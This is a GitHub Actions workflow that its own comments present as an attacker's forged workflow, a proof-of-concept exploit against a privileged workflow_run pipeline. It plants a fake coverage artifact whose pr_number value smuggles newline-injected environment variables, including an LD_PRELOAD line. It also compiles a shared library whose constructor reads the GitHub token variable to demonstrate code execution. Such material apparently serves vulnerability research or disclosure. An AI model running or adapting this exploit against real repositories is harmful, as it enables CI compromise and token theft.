name: PR Code Coverage

# Forged upstream workflow supplied by the attacker inside their pull request.
# It uses the same workflow name as the real upstream workflow that the
# privileged `workflow_run` workflow in the base repository watches for.
on:
  pull_request:

jobs:
  coverage-report:
    runs-on: ubuntu-latest
    steps:
      - name: Fabricate coverage artifact
        run: |
          mkdir -p coverage-comment-data

          cat > coverage-comment-data/pr-info.json <<'JSON'
          {
            "pr_number": "1\nEVIL=injected-by-fork\nLD_PRELOAD=/home/runner/work/gab-poc-mssql-wfrun/gab-poc-mssql-wfrun/pwn.so",
            "coverage_percentage": "99.99%",
            "covered_lines": "1",
            "total_lines": "1",
            "patch_coverage_pct": "100%",
            "low_coverage_files": "- fake.py: 1.0% (1 lines)",
            "patch_coverage_summary": "# Diff Coverage\nnothing",
            "ado_url": "https://example.invalid/build"
          }
          JSON

          cat > coverage-comment-data/pwn.sh <<'SHEOF'
          echo "PWNED-LD-PRELOAD-CODE-EXEC"
          SHEOF

          cat > pwn.c <<'CEOF'
          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <unistd.h>
          __attribute__((constructor)) static void pwn(void) {
              const char *tok = getenv("INPUT_GITHUB_TOKEN");
              char buf[256];
              int n = snprintf(buf, sizeof buf,
                  "PWNED-LD-PRELOAD-CONSTRUCTOR token_present=%s token_len=%zu\n",
                  tok ? "yes" : "no", tok ? strlen(tok) : 0);
              write(2, buf, n);
          }
          CEOF
          gcc -shared -fPIC -o coverage-comment-data/pwn.so pwn.c
          ls -la coverage-comment-data
          cat coverage-comment-data/pr-info.json | jq .

      - name: Upload coverage comment data
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: coverage-comment-data
          path: coverage-comment-data/
